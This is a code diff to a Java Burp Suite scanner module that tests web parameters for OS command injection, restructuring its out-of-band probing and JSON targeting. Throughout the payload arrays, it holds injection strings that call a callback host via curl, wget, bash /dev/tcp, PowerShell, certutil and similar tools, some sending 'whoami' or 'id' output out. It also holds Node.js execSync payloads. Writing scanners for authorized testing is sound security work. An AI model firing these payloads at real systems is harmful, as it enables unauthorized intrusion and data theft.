@@ -16,6 +16,7 @@ import com.omnistrike.framework.TimingLock;
 
 import com.omnistrike.model.*;
 
+import java.net.URI;
 import java.nio.charset.StandardCharsets;
 import java.security.SecureRandom;
 import java.util.*;
@@ -37,7 +38,7 @@ public class CommandInjectionScanner implements ScanModule {
     private FindingsStore findingsStore;
     private CollaboratorManager collaboratorManager;
     // Parameters confirmed exploitable via OOB — skip all remaining phases for these
-    private final Set<String> oobConfirmedParams = ConcurrentHashMap.newKeySet();
+    private final Set<String> oobConfirmedTargets = ConcurrentHashMap.newKeySet();
 
     private static final SecureRandom SECURE_RANDOM = new SecureRandom();
 
@@ -213,9 +214,6 @@ public class CommandInjectionScanner implements ScanModule {
             {"|curl${IFS}http://COLLAB_PLACEHOLDER/cmdi", "curl IFS piped (Unix)"},
             // Python popen
             {";python -c \"import os;os.popen('nslookup COLLAB_PLACEHOLDER')\" ;", "python popen (Unix)"},
-            // curl POST with data exfil
-            {";curl http://COLLAB_PLACEHOLDER/$(whoami);", "curl whoami exfil (Unix)"},
-            {";wget -q http://COLLAB_PLACEHOLDER/$(id|base64) -O /dev/null;", "wget id exfil (Unix)"},
             // Perl OOB
             {";perl -e 'use IO::Socket::INET;IO::Socket::INET->new(PeerAddr=>\"COLLAB_PLACEHOLDER\",PeerPort=>80)';", "perl socket (Unix)"},
             // Python OOB
@@ -225,8 +223,6 @@ public class CommandInjectionScanner implements ScanModule {
             {";ruby -e 'require\"net/http\";Net::HTTP.get(URI(\"http://COLLAB_PLACEHOLDER/cmdi\"))';", "ruby http (Unix)"},
             // PHP OOB
             {";php -r 'file_get_contents(\"http://COLLAB_PLACEHOLDER/cmdi\");';", "php file_get (Unix)"},
-            // openssl OOB
-            {";openssl s_client -connect COLLAB_PLACEHOLDER:443 2>/dev/null;", "openssl connect (Unix)"},
             // bash /dev/tcp
             {";bash -c 'echo > /dev/tcp/COLLAB_PLACEHOLDER/80';", "bash dev-tcp (Unix)"},
             // nc/netcat
@@ -238,23 +234,11 @@ public class CommandInjectionScanner implements ScanModule {
             {"| nslookup COLLAB_PLACEHOLDER", "nslookup piped (Windows)"},
             {"& ping -n 1 COLLAB_PLACEHOLDER &", "ping (Windows)"},
             {"| ping -n 1 COLLAB_PLACEHOLDER", "ping piped (Windows)"},
-            {"& certutil -urlcache -split -f http://COLLAB_PLACEHOLDER/cmdi &", "certutil (Windows)"},
             {"& powershell Invoke-WebRequest http://COLLAB_PLACEHOLDER/cmdi &", "powershell IWR (Windows)"},
-            {"& powershell (New-Object Net.WebClient).DownloadString('http://COLLAB_PLACEHOLDER/cmdi') &", "powershell WebClient (Windows)"},
             // PowerShell DNS resolution
             {"& powershell -c \"Resolve-DnsName COLLAB_PLACEHOLDER\" &", "powershell DNS (Windows)"},
             // PowerShell Net.Sockets
             {"& powershell -c \"(New-Object Net.Sockets.TcpClient).Connect('COLLAB_PLACEHOLDER',80)\" &", "powershell TCP (Windows)"},
-            // bitsadmin
-            {"& bitsadmin /transfer omni http://COLLAB_PLACEHOLDER/cmdi %temp%\\omni &", "bitsadmin (Windows)"},
-            // mshta
-            {"& mshta http://COLLAB_PLACEHOLDER/cmdi &", "mshta (Windows)"},
-            // rundll32
-            {"& rundll32 url.dll,FileProtocolHandler http://COLLAB_PLACEHOLDER/cmdi &", "rundll32 (Windows)"},
-            // explorer
-            {"& start http://COLLAB_PLACEHOLDER/cmdi &", "start URL (Windows)"},
-            // wmic process call
-            {"& wmic process call create \"cmd /c nslookup COLLAB_PLACEHOLDER\" &", "wmic process (Windows)"},
             // curl (modern Windows)
             {"& curl http://COLLAB_PLACEHOLDER/cmdi &", "curl (Windows)"},
     };
@@ -330,6 +314,13 @@ public class CommandInjectionScanner implements ScanModule {
             {"'}) + global.process.mainModule.require('child_process').execSync('id').toString()//", "REGEX:uid=\\d+\\([\\w.-]+\\)\\s+gid=\\d+", "global.process execSync id (obj+paren)"},
     };
 
+    // A compact first-stage OOB battery. Less common bypass variants are deferred until
+    // direct output/error probes fail, preserving full coverage without front-loading
+    // every OOB request for straightforward vulnerabilities.
+    private static final Set<Integer> FAST_OOB_UNIX = Set.of(0, 4, 8, 12, 13, 21);
+    private static final Set<Integer> FAST_OOB_WINDOWS = Set.of(0, 4, 5, 6, 7);
+    private static final Set<Integer> FAST_OOB_NODEJS = Set.of(0, 2, 7, 10);
+
     @Override
     public String getId() { return "cmdi-scanner"; }
 
@@ -364,25 +355,24 @@ public class CommandInjectionScanner implements ScanModule {
     public List<Finding> processHttpFlowForParameter(
             HttpRequestResponse requestResponse, String targetParameterName, MontoyaApi api) {
         HttpRequest request = requestResponse.request();
-        String urlPath = extractPath(request.url());
         List<CmdiTarget> targets = extractTargets(request);
-        targets.removeIf(t -> !t.name.equalsIgnoreCase(targetParameterName));
-        return runCmdiTargets(requestResponse, targets, urlPath);
+        targets.removeIf(t -> !t.matchesParameterName(targetParameterName));
+        return runCmdiTargets(requestResponse, targets);
     }
 
     @Override
     public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
         HttpRequest request = requestResponse.request();
-        String urlPath = extractPath(request.url());
         List<CmdiTarget> targets = extractTargets(request);
-        return runCmdiTargets(requestResponse, targets, urlPath);
+        return runCmdiTargets(requestResponse, targets);
     }
 
     private List<Finding> runCmdiTargets(HttpRequestResponse requestResponse,
-                                          List<CmdiTarget> targets, String urlPath) {
+                                          List<CmdiTarget> targets) {
         for (CmdiTarget target : targets) {
             if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return Collections.emptyList();
-            if (!dedup.markIfNew("cmdi-scanner", urlPath, target.name)) continue;
+            String targetKey = scanTargetKey(requestResponse.request(), target);
+            if (!dedup.markIfNewRaw("cmdi-scanner:" + targetKey)) continue;
 
             try {
                 testCommandInjection(requestResponse, target);
@@ -400,21 +390,20 @@ public class CommandInjectionScanner implements ScanModule {
     private void testCommandInjection(HttpRequestResponse original, CmdiTarget target) throws InterruptedException {
         String url = original.request().url();
         int delaySecs = config.getInt("cmdi.delaySecs", 18);
+        boolean oobAvailable = config.getBool("cmdi.oob.enabled", true)
+                && collaboratorManager != null && collaboratorManager.isAvailable();
 
-        // Phase 1: OOB via Collaborator (FIRST — fastest path to confirmed finding)
-        if (config.getBool("cmdi.oob.enabled", true)
-                && collaboratorManager != null && collaboratorManager.isAvailable()) {
-            testOob(original, target, url);
-            // Fire SSJI OOB callbacks immediately for JSON params — do NOT wait behind Phase 5
-            // time-based tests. Without this, SSJI callbacks would only fire after 30+ minutes
-            // of traditional time-based probing (18s × many payloads × 3 verification steps).
+        // Phase 1: compact OOB canary set. The remaining bypass variants are deferred
+        // until direct confirmation fails, avoiding a 41/55-request front-loaded battery.
+        if (oobAvailable) {
+            testOobStage(original, target, url, true);
             if (target.type == CmdiTargetType.JSON && config.getBool("cmdi.nodejs.enabled", true)) {
-                testNodejsOob(original, target, url);
+                testNodejsOobStage(original, target, url, true);
             }
         }
 
         // Phase 2: Baseline (multi-measurement for accuracy)
-        if (oobConfirmedParams.contains(target.name)) return;
+        if (isOobConfirmed(original, target)) return;
         TimedResult baselineResult = measureResponseTime(original, target, target.originalValue);
         long baselineTime = baselineResult.elapsedMs;
         HttpRequestResponse baseline = baselineResult.response;
@@ -432,21 +421,21 @@ public class CommandInjectionScanner implements ScanModule {
         // Skip output-based for header targets — header injection causes response differences
         // (WAF blocks, routing changes, logging errors) unrelated to command execution.
         // Headers are only tested via time-based (below).
-        if (oobConfirmedParams.contains(target.name)) return;
+        if (isOobConfirmed(original, target)) return;
         if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
         if (target.type != CmdiTargetType.HEADER && config.getBool("cmdi.output.enabled", true)) {
             if (testOutputBased(original, target, url, baselineBody, OUTPUT_PAYLOADS_UNIX, "Unix")) return;
         }
 
         // Phase 4: Output-based detection (Windows)
-        if (oobConfirmedParams.contains(target.name)) return;
+        if (isOobConfirmed(original, target)) return;
         if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
         if (target.type != CmdiTargetType.HEADER && config.getBool("cmdi.output.enabled", true)) {
             if (testOutputBased(original, target, url, baselineBody, OUTPUT_PAYLOADS_WINDOWS, "Windows")) return;
         }
 
         // Phase 4b: Windows math + error detection (dynamic operands, independent probes).
-        if (oobConfirmedParams.contains(target.name)) return;
+        if (isOobConfirmed(original, target)) return;
         if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
         if (target.type != CmdiTargetType.HEADER && config.getBool("cmdi.output.enabled", true)) {
             if (testWindowsEchoError(original, target, url, baselineBody)) return;
@@ -454,14 +443,24 @@ public class CommandInjectionScanner implements ScanModule {
 
         // Phase 4c: Linux math + error detection (dynamic operands, independent probes).
         // Catches apps that surface stdout (expr result) or stderr (sh/bash/zsh "not found" errors).
-        if (oobConfirmedParams.contains(target.name)) return;
+        if (isOobConfirmed(original, target)) return;
         if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
         if (target.type != CmdiTargetType.HEADER && config.getBool("cmdi.output.enabled", true)) {
             if (testLinuxMathError(original, target, url, baselineBody)) return;
         }
 
+        // Phase 4d: direct probes failed, so finish the less-common OOB bypass battery.
+        // A callback from the first stage stops this loop immediately.
+        if (isOobConfirmed(original, target)) return;
+        if (oobAvailable) {
+            testOobStage(original, target, url, false);
+            if (target.type == CmdiTargetType.JSON && config.getBool("cmdi.nodejs.enabled", true)) {
+                testNodejsOobStage(original, target, url, false);
+            }
+        }
+
         // Phase 5: Time-based blind — serialized via TimingLock; skipped when the UI toggle is off
-        if (oobConfirmedParams.contains(target.name)) return;
+        if (isOobConfirmed(original, target)) return;
         if (TimingLock.isEnabled()) {
             try {
                 TimingLock.acquire();
@@ -482,7 +481,7 @@ public class CommandInjectionScanner implements ScanModule {
         // Phase 6: Node.js Server-Side JavaScript Injection — JSON parameters only.
         // OOB and output-based sub-phases always run; time-based sub-phase respects the
         // same TimingLock.isEnabled() gate as Phase 5.
-        if (oobConfirmedParams.contains(target.name)) return;
+        if (isOobConfirmed(original, target)) return;
         if (target.type == CmdiTargetType.JSON && config.getBool("cmdi.nodejs.enabled", true)) {
             if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
             testNodejsInjection(original, target, url, baselineTime, baselineBody, delaySecs);
@@ -502,6 +501,7 @@ public class CommandInjectionScanner implements ScanModule {
 
         for (String[] payloadInfo : payloads) {
             if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
+            if (isOobConfirmed(original, target)) return false;
             String payloadTemplate = payloadInfo[0];
             String technique = payloadInfo[1];
             String truePayload = payloadTemplate.replace("SLEEP_SECS", String.valueOf(delaySecs));
@@ -998,8 +998,8 @@ public class CommandInjectionScanner implements ScanModule {
                                       long baselineTime, String baselineBody, int delaySecs)
             throws InterruptedException {
 
-        // OOB already fired in Phase 1 — skip here and check if already confirmed.
-        if (oobConfirmedParams.contains(target.name)) return;
+        // OOB stages already ran before timing tests — check whether either confirmed.
+        if (isOobConfirmed(original, target)) return;
 
         // Sub-phase 6a: JS arithmetic output — proves eval injection without requiring shell access.
         // Injects (A*B).toString() with random operands per context breaker. The result is
@@ -1009,7 +1009,7 @@ public class CommandInjectionScanner implements ScanModule {
         if (config.getBool("cmdi.output.enabled", true)) {
             if (testNodejsMath(original, target, url, baselineBody)) return;
         }
-        if (oobConfirmedParams.contains(target.name)) return;
+        if (isOobConfirmed(original, target)) return;
 
         // Sub-phase 6b: execSync output-based (id, /etc/passwd reflected in response body).
         // Proves OS command execution when command output is surfaced in the JSON response.
@@ -1017,7 +1017,7 @@ public class CommandInjectionScanner implements ScanModule {
         if (config.getBool("cmdi.output.enabled", true)) {
             if (testOutputBased(original, target, url, baselineBody, NODEJS_OUTPUT_PAYLOADS, "Node.js SSJI")) return;
         }
-        if (oobConfirmedParams.contains(target.name)) return;
+        if (isOobConfirmed(original, target)) return;
 
         // Sub-phase 6c: Time-based blind — requires the global "Time-Based Testing" UI toggle
         if (!TimingLock.isEnabled()) return;
@@ -1066,7 +1066,7 @@ public class CommandInjectionScanner implements ScanModule {
 
         for (String breaker : breakers) {
             if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return false;
-            if (oobConfirmedParams.contains(target.name)) return false;
+            if (isOobConfirmed(original, target)) return false;
 
             int a = 1000 + SECURE_RANDOM.nextInt(9000);
             int b = 1000 + SECURE_RANDOM.nextInt(9000);
@@ -1133,30 +1133,40 @@ public class CommandInjectionScanner implements ScanModule {
         return false;
     }
 
-    private void testNodejsOob(HttpRequestResponse original, CmdiTarget target, String url)
+    private void testNodejsOobStage(HttpRequestResponse original, CmdiTarget target, String url,
+                                    boolean fastStage)
             throws InterruptedException {
-        for (String[] payloadInfo : NODEJS_OOB_PAYLOADS) {
+        for (int i = 0; i < NODEJS_OOB_PAYLOADS.length; i++) {
             if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
-            if (oobConfirmedParams.contains(target.name)) return;
+            if (isOobConfirmed(original, target)) return;
+            if (FAST_OOB_NODEJS.contains(i) != fastStage) continue;
+            String[] payloadInfo = NODEJS_OOB_PAYLOADS[i];
             sendOobPayload(original, target, url, payloadInfo[0], payloadInfo[1], "Node.js SSJI");
         }
     }
 
     // ==================== OOB VIA COLLABORATOR ====================
 
-    private void testOob(HttpRequestResponse original, CmdiTarget target, String url) throws InterruptedException {
+    private void testOobStage(HttpRequestResponse original, CmdiTarget target, String url,
+                              boolean fastStage) throws InterruptedException {
         // Unix OOB payloads
         if (config.getBool("cmdi.unix.enabled", true)) {
-            for (String[] payloadInfo : OOB_PAYLOADS_UNIX) {
+            for (int i = 0; i < OOB_PAYLOADS_UNIX.length; i++) {
                 if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
+                if (isOobConfirmed(original, target)) return;
+                if (FAST_OOB_UNIX.contains(i) != fastStage) continue;
+                String[] payloadInfo = OOB_PAYLOADS_UNIX[i];
                 sendOobPayload(original, target, url, payloadInfo[0], payloadInfo[1], "Unix");
             }
         }
 
         // Windows OOB payloads
         if (config.getBool("cmdi.windows.enabled", true)) {
-            for (String[] payloadInfo : OOB_PAYLOADS_WINDOWS) {
+            for (int i = 0; i < OOB_PAYLOADS_WINDOWS.length; i++) {
                 if (Thread.currentThread().isInterrupted() || com.omnistrike.framework.ScanState.isCancelled()) return;
+                if (isOobConfirmed(original, target)) return;
+                if (FAST_OOB_WINDOWS.contains(i) != fastStage) continue;
+                String[] payloadInfo = OOB_PAYLOADS_WINDOWS[i];
                 sendOobPayload(original, target, url, payloadInfo[0], payloadInfo[1], "Windows");
             }
         }
@@ -1183,7 +1193,7 @@ public class CommandInjectionScanner implements ScanModule {
                     }
                     // Mark parameter as confirmed — skip all remaining phases (HTTP only, DNS continues scanning)
                     if (interaction.type() == InteractionType.HTTP) {
-                        oobConfirmedParams.add(target.name);
+                        oobConfirmedTargets.add(scanTargetKey(original.request(), target));
                     }
                     findingsStore.addFinding(Finding.builder("cmdi-scanner",
                                     "OS Command Injection (Out-of-Band) - " + osType,
@@ -1277,16 +1287,9 @@ public class CommandInjectionScanner implements ScanModule {
                 return PayloadEncoder.injectCookie(request, target.name, payload);
             case JSON:
                 String body = request.bodyToString();
-                String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
-                if (target.name.contains(".")) {
-                    // Nested key — parse, replace, serialize (pass raw payload; Gson escapes internally)
-                    String newBody = replaceNestedJsonValue(body, target.name, payload);
-                    return request.withBody(newBody);
-                } else {
-                    String pattern = "\"" + java.util.regex.Pattern.quote(target.name) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
-                    String replacement = "\"" + target.name + "\": \"" + escaped + "\"";
-                    return request.withBody(body.replaceFirst(pattern, java.util.regex.Matcher.quoteReplacement(replacement)));
-                }
+                // Structural replacement handles nested values, arrays, negative/exponent
+                // numbers, and literal keys containing dots without regex ambiguity.
+                return request.withBody(replaceJsonValue(body, target.jsonPath, payload));
             case HEADER:
                 return request.withRemovedHeader(target.name).withAddedHeader(target.name, payload);
             case PATH_SEGMENT:
@@ -1332,25 +1335,35 @@ public class CommandInjectionScanner implements ScanModule {
      * Replace a value at a dot-notation path in a JSON string.
      * E.g., path "user.profile.name" replaces the value at obj.user.profile.name.
      */
-    private String replaceNestedJsonValue(String jsonBody, String dotPath, String escapedValue) {
+    static String replaceJsonValue(String jsonBody, List<Object> jsonPath, String value) {
         try {
             com.google.gson.JsonElement root = com.google.gson.JsonParser.parseString(jsonBody);
-            if (!root.isJsonObject()) return jsonBody;
+            if (jsonPath == null || jsonPath.isEmpty()) return jsonBody;
 
-            String[] parts = dotPath.split("\\.");
-            com.google.gson.JsonObject current = root.getAsJsonObject();
-
-            // Traverse to the parent of the target key
-            for (int i = 0; i < parts.length - 1; i++) {
-                com.google.gson.JsonElement child = current.get(parts[i]);
-                if (child == null || !child.isJsonObject()) return jsonBody;
-                current = child.getAsJsonObject();
+            com.google.gson.JsonElement current = root;
+            for (int i = 0; i < jsonPath.size() - 1; i++) {
+                Object part = jsonPath.get(i);
+                if (part instanceof String key && current.isJsonObject()) {
+                    current = current.getAsJsonObject().get(key);
+                } else if (part instanceof Integer index && current.isJsonArray()
+                        && index >= 0 && index < current.getAsJsonArray().size()) {
+                    current = current.getAsJsonArray().get(index);
+                } else {
+                    return jsonBody;
+                }
+                if (current == null) return jsonBody;
             }
 
-            // Replace the leaf value
-            String leafKey = parts[parts.length - 1];
-            if (current.has(leafKey)) {
-                current.addProperty(leafKey, escapedValue);
+            Object leaf = jsonPath.get(jsonPath.size() - 1);
+            com.google.gson.JsonPrimitive replacement = new com.google.gson.JsonPrimitive(value);
+            if (leaf instanceof String key && current.isJsonObject()
+                    && current.getAsJsonObject().has(key)) {
+                current.getAsJsonObject().add(key, replacement);
+            } else if (leaf instanceof Integer index && current.isJsonArray()
+                    && index >= 0 && index < current.getAsJsonArray().size()) {
+                current.getAsJsonArray().set(index, replacement);
+            } else {
+                return jsonBody;
             }
 
             return new com.google.gson.Gson().toJson(root);
@@ -1379,14 +1392,12 @@ public class CommandInjectionScanner implements ScanModule {
         for (var h : request.headers()) {
             if (h.name().equalsIgnoreCase("Content-Type")) { ct = h.value(); break; }
         }
-        if (ct.contains("application/json")) {
+        if (ct.toLowerCase(Locale.ROOT).contains("application/json")) {
             try {
                 String body = request.bodyToString();
                 if (body != null) {
                     com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
-                    if (el.isJsonObject()) {
-                        extractJsonParams(el.getAsJsonObject(), "", targets);
-                    }
+                    extractJsonParams(el, "", new ArrayList<>(), targets);
                 }
             } catch (Exception ignored) {}
         }
@@ -1414,16 +1425,37 @@ public class CommandInjectionScanner implements ScanModule {
     /**
      * Recursively extract JSON parameters using dot-notation for nested objects.
      */
-    private void extractJsonParams(com.google.gson.JsonObject obj, String prefix, List<CmdiTarget> targets) {
-        for (String key : obj.keySet()) {
-            com.google.gson.JsonElement val = obj.get(key);
-            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
-            if (val.isJsonPrimitive() && (val.getAsJsonPrimitive().isString() || val.getAsJsonPrimitive().isNumber())) {
-                targets.add(new CmdiTarget(fullKey, val.getAsString(), CmdiTargetType.JSON));
-            } else if (val.isJsonObject()) {
-                extractJsonParams(val.getAsJsonObject(), fullKey, targets);
+    private void extractJsonParams(com.google.gson.JsonElement element, String displayPath,
+                                   List<Object> jsonPath, List<CmdiTarget> targets) {
+        if (element.isJsonObject()) {
+            for (String key : element.getAsJsonObject().keySet()) {
+                List<Object> childPath = new ArrayList<>(jsonPath);
+                childPath.add(key);
+                extractJsonParams(element.getAsJsonObject().get(key), appendJsonKey(displayPath, key),
+                        childPath, targets);
+            }
+        } else if (element.isJsonArray()) {
+            for (int i = 0; i < element.getAsJsonArray().size(); i++) {
+                List<Object> childPath = new ArrayList<>(jsonPath);
+                childPath.add(i);
+                extractJsonParams(element.getAsJsonArray().get(i), displayPath + "[" + i + "]",
+                        childPath, targets);
+            }
+        } else if (element.isJsonPrimitive()) {
+            com.google.gson.JsonPrimitive primitive = element.getAsJsonPrimitive();
+            if (primitive.isString() || primitive.isNumber()) {
+                targets.add(new CmdiTarget(displayPath, primitive.getAsString(),
+                        CmdiTargetType.JSON, jsonPath));
             }
         }
+    }
+
+    private static String appendJsonKey(String prefix, String key) {
+        if (key.matches("[A-Za-z_][A-Za-z0-9_-]*")) {
+            return prefix.isEmpty() ? key : prefix + "." + key;
+        }
+        String quoted = key.replace("\\", "\\\\").replace("\"", "\\\"");
+        return prefix + "[\"" + quoted + "\"]";
     }
 
     // Common route words to skip when extracting path segment targets
@@ -1481,6 +1513,42 @@ public class CommandInjectionScanner implements ScanModule {
         }
     }
 
+    private boolean isOobConfirmed(HttpRequestResponse original, CmdiTarget target) {
+        return oobConfirmedTargets.contains(scanTargetKey(original.request(), target));
+    }
+
+    private static String scanTargetKey(HttpRequest request, CmdiTarget target) {
+        return buildTargetIdentity(request.url(), request.method(), target.type.name(), target.identityName());
+    }
+
+    static String buildTargetIdentity(String url, String method, String targetType, String targetName) {
+        return normalizeEndpoint(url) + "|"
+                + (method == null ? "GET" : method.toUpperCase(Locale.ROOT))
+                + "|" + targetType + "|" + targetName;
+    }
+
+    private static String normalizeEndpoint(String url) {
+        try {
+            URI uri = URI.create(url);
+            String scheme = uri.getScheme() == null
+                    ? "http" : uri.getScheme().toLowerCase(Locale.ROOT);
+            String host = uri.getHost();
+            if (host == null) throw new IllegalArgumentException("URL has no host");
+            host = host.toLowerCase(Locale.ROOT);
+            if (host.contains(":")) host = "[" + host + "]";
+            int port = uri.getPort();
+            boolean defaultPort = port < 0
+                    || (port == 80 && scheme.equals("http"))
+                    || (port == 443 && scheme.equals("https"));
+            String path = uri.getRawPath();
+            if (path == null || path.isEmpty()) path = "/";
+            return scheme + "://" + host + (defaultPort ? "" : ":" + port) + path;
+        } catch (Exception ignored) {
+            int query = url == null ? -1 : url.indexOf('?');
+            return url == null ? "" : (query >= 0 ? url.substring(0, query) : url);
+        }
+    }
+
     private String extractPath(String url) {
         try {
             if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
@@ -1496,14 +1564,42 @@ public class CommandInjectionScanner implements ScanModule {
     }
 
     @Override
-    public void destroy() { }
+    public void destroy() { oobConfirmedTargets.clear(); }
 
     private enum CmdiTargetType { QUERY, BODY, COOKIE, JSON, HEADER, PATH_SEGMENT }
 
     private static class CmdiTarget {
         final String name, originalValue;
         final CmdiTargetType type;
-        CmdiTarget(String n, String v, CmdiTargetType t) { name = n; originalValue = v != null ? v : ""; type = t; }
+        final List<Object> jsonPath;
+        CmdiTarget(String n, String v, CmdiTargetType t) { this(n, v, t, null); }
+        CmdiTarget(String n, String v, CmdiTargetType t, List<Object> jsonPath) {
+            name = n;
+            originalValue = v != null ? v : "";
+            type = t;
+            this.jsonPath = jsonPath == null ? null : List.copyOf(jsonPath);
+        }
+        String identityName() {
+            if (jsonPath == null) return name;
+            StringBuilder out = new StringBuilder();
+            for (Object part : jsonPath) {
+                if (part instanceof String key) {
+                    out.append('/').append(key.replace("~", "~0").replace("/", "~1"));
+                } else {
+                    out.append('/').append(part);
+                }
+            }
+            return out.toString();
+        }
+        boolean matchesParameterName(String requestedName) {
+            if (requestedName == null) return false;
+            if (name.equalsIgnoreCase(requestedName)) return true;
+            if (jsonPath != null && !jsonPath.isEmpty()) {
+                Object leaf = jsonPath.get(jsonPath.size() - 1);
+                return leaf instanceof String key && key.equalsIgnoreCase(requestedName);
+            }
+            return false;
+        }
     }
 
 }
